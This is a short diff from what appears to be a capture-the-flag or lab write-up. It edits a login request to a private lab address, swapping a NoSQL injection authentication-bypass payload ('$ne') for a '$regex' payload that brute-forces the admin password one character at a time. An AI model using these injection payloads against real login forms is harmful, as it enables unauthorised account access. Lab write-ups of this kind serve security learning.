@@ -96,5 +96,5 @@ Connection: close
 Referer: http://10.10.11.139:5000/login
 Upgrade-Insecure-Requests: 1
 
-{"user":"admin","password":{"$ne":"admin"}}
+{"user":"admin","password":{"$regex":"^A"}}    # bruteforce password start with A
 ```
